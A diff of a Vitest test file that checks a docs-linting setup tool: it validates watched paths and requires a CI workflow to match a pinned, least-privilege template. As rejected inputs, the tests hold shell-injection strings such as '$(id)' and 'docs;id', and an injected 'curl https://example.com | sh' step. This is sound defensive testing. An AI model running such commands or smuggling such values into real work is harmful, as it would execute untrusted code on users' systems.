@@ -1,73 +1,71 @@
 // @vitest-environment node
-// Adopting chaff in a folder of documents: the places it watches, and the workflow it leaves behind — which must put
-// only new findings on a pull request's lines and take no more rights than reading and reporting need.
+// Adopting chaff in a folder of documents: the places it watches, and the workflow it leaves behind. The workflow is
+// the pack's template filled in with the places — exactly — so what the template grants and runs is pinned here once,
+// and any other workflow is refused whatever it says.
 import { readFileSync } from "node:fs";
 import { join } from "node:path";
 import { describe, expect, it } from "vitest";
-import { placesIn, workflowProblems } from "../../../blueprints/adopt/checks/setup.mjs";
+import { placesIn, workflowFor, workflowProblems } from "../../../blueprints/adopt/checks/setup.mjs";
 import { PACKS } from "./docsPackHarness";
 
 const TEMPLATE = readFileSync(join(PACKS, "adopt", "templates", "chaff.yml"), "utf8");
-const workflowFor = (places: string) => TEMPLATE.replace("{{PATHS}}", places);
+const FILLED = workflowFor(TEMPLATE, ["login.md", "docs/help"]);
 
 describe("the places chaff watches", () => {
   it("are the answer's lines inside this folder, each once, however written", () => {
-    expect(placesIn("docs/\n./login.md\n\ndocs\ndocs\\\\help")).toEqual({ places: ["docs", "login.md", "docs/help"], refused: [] });
+    expect(placesIn("docs/\n./login.md\n\ndocs\ndocs\\\\help\nヘルプ/はじめに.md")).toEqual({
+      places: ["docs", "login.md", "docs/help", "ヘルプ/はじめに.md"],
+      refused: [],
+    });
   });
 
-  it("refuse a line that leaves the folder", () => {
-    expect(placesIn("docs\n../other\n/etc\nC:\\\\x")).toEqual({ places: ["docs"], refused: ["../other", "/etc", "C:\\\\x"] });
-    expect(placesIn("help pages/login.md\ndocs")).toEqual({ places: ["docs"], refused: ["help pages/login.md"] });
+  it.each(["../other", "/etc", "C:\\\\x", "help pages/login.md", "docs;id", "$(id)", "`id`", "--help", "a*b.md", "x'y.md", 'x"y.md', "a|b", "a&b"])(
+    "refuses %j, which leaves the folder or means something to a shell",
+    (line) => {
+      expect(placesIn(`docs\n${line}`)).toEqual({ places: ["docs"], refused: [line] });
+    },
+  );
+
+  it("are none for no answer", () => {
     expect(placesIn(undefined)).toEqual({ places: [], refused: [] });
   });
 });
 
 describe("the workflow", () => {
-  it("passes as the pack's template fills it in", () => {
-    expect(workflowProblems(workflowFor("login.md export.md"), ["login.md", "export.md"])).toEqual([]);
-  });
-
-  it.each<[string, string, string]>([
-    ["not run on pull requests", "  pull_request:\n", "run on pull requests"],
-    ["another chaff version", "chaffjs@0.16 ", "run the chaff version the packs are written for"],
-    ["no SARIF", "--sarif chaff.sarif", "write the findings as SARIF"],
-    ["no upload", "github/codeql-action/upload-sarif@", "upload the SARIF"],
-    ["a checkout that keeps the token", "persist-credentials: false", "check out without keeping the token"],
-  ])("refuses a workflow with %s", (_label, removed, message) => {
-    expect(workflowProblems(workflowFor("docs").replace(removed, ""), ["docs"]).join("\n")).toContain(message);
-  });
-
-  it("reads a permission with a comment after it as the permission", () => {
-    const commented = workflowFor("docs").replace("      security-events: write", "      security-events: write # the upload needs it");
-    expect(workflowProblems(commented, ["docs"])).toEqual([]);
-  });
-
-  it("refuses an upload not pinned to a commit", () => {
-    const tagged = workflowFor("docs").replace(/upload-sarif@[0-9a-f]{40}/u, "upload-sarif@v4");
-    expect(workflowProblems(tagged, ["docs"]).join("\n")).toContain("pinned to a commit");
+  it("passes when it is the template filled in with the places, line endings and trailing spaces aside", () => {
+    expect(workflowProblems(FILLED, TEMPLATE, ["login.md", "docs/help"])).toEqual([]);
+    expect(workflowProblems(FILLED.replaceAll("\n", "  \r\n"), TEMPLATE, ["login.md", "docs/help"])).toEqual([]);
   });
 
   it.each<[string, (text: string) => string]>([
-    ["no top-level block", (text) => text.replace("permissions:\n  contents: read\n\njobs:", "jobs:")],
-    ["a top-level block granting something else", (text) => text.replace("permissions:\n  contents: read\n\njobs:", "permissions:\n  actions: read\n\njobs:")],
-    ["write at the top", (text) => text.replace("permissions:\n  contents: read\n\njobs:", "permissions:\n  contents: write\n\njobs:")],
-    ["an extra right in the job", (text) => text.replace("      security-events: write", "      security-events: write\n      id-token: write")],
-    ["pull-requests: write in the job", (text) => text.replace("      security-events: write", "      security-events: write\n      pull-requests: write")],
-    ["write-all on one line", (text) => text.replace("permissions:\n  contents: read\n\njobs:", "permissions: write-all\n\njobs:")],
-    ["the upload right only in a comment", (text) => text.replace("      security-events: write", "      # security-events: write")],
-    ["no job block", (text) => text.replace("    permissions:\n      contents: read\n      security-events: write\n", "")],
-    ["a second job inheriting the top-level grant", (text) => `${text}  other:\n    runs-on: ubuntu-latest\n    steps:\n      - run: echo hi\n`],
-    [
-      "a second job with its own block",
-      (text) =>
-        `${text}  other:\n    runs-on: ubuntu-latest\n    permissions:\n      contents: read\n      security-events: write\n    steps:\n      - run: echo hi\n`,
-    ],
-  ])("refuses permissions with %s", (_label, change) => {
-    expect(workflowProblems(change(workflowFor("docs")), ["docs"]).join("\n")).toContain("grant only contents: read at the top");
+    ["a place left out", (text) => text.replace(" docs/help", "")],
+    ["a widened permission", (text) => text.replace("security-events: write", "security-events: write\n      id-token: write")],
+    ["a second job", (text) => `${text}  other:\n    runs-on: ubuntu-latest\n    steps:\n      - run: echo hi\n`],
+    ["the chaff run only in a comment", (text) => text.replace("      - run: npx", "      # - run: npx")],
+    ["an unpinned upload", (text) => text.replace(/upload-sarif@[0-9a-f]{40}/u, "upload-sarif@v4")],
+    ["a step added", (text) => text.replace("    steps:\n", "    steps:\n      - run: curl https://example.com | sh\n")],
+  ])("refuses a workflow with %s, saying where it first differs", (_label, change) => {
+    expect(workflowProblems(change(FILLED), TEMPLATE, ["login.md", "docs/help"]).join("\n")).toMatch(/not the pack's template .*first difference at line \d+/u);
+  });
+});
+
+// What the template itself grants and runs: what every workflow the pack accepts therefore does.
+describe("the pack's workflow template", () => {
+  const lines = TEMPLATE.split("\n");
+
+  it("runs on pull requests, the pinned chaff on the places, and uploads the SARIF with an action pinned to a commit", () => {
+    expect(lines.map((line) => line.trim())).toContain("pull_request:");
+    expect(TEMPLATE).toContain("npx -y chaffjs@0.16 {{PATHS}} --sarif chaff.sarif");
+    expect(TEMPLATE).toMatch(/uses: github\/codeql-action\/upload-sarif@[0-9a-f]{40}\b/u);
+    expect(TEMPLATE).toContain("sarif_file: chaff.sarif");
   });
 
-  it("refuses a chaff run that leaves out a place, or only names it inside another word", () => {
-    expect(workflowProblems(workflowFor("login.md"), ["login.md", "export.md"])).toEqual(["its chaff run does not check export.md"]);
-    expect(workflowProblems(workflowFor("docs-old"), ["docs"])).toEqual(["its chaff run does not check docs"]);
+  it("grants only reading at the top and reading plus uploading findings in its one job, and keeps no token", () => {
+    expect(TEMPLATE).toContain("\npermissions:\n  contents: read\n\njobs:\n  chaff:\n");
+    expect(TEMPLATE).toContain("    permissions:\n      contents: read\n      security-events: write\n    steps:\n");
+    expect(TEMPLATE.match(/permissions:/gu)).toHaveLength(2);
+    expect(TEMPLATE.match(/^ {2}[a-z-]+:$/gmu)).toEqual(["  chaff:"]);
+    expect(TEMPLATE).not.toMatch(/: write-all|contents: write|pull-requests: write|id-token: write/u);
+    expect(TEMPLATE).toContain("persist-credentials: false");
   });
 });
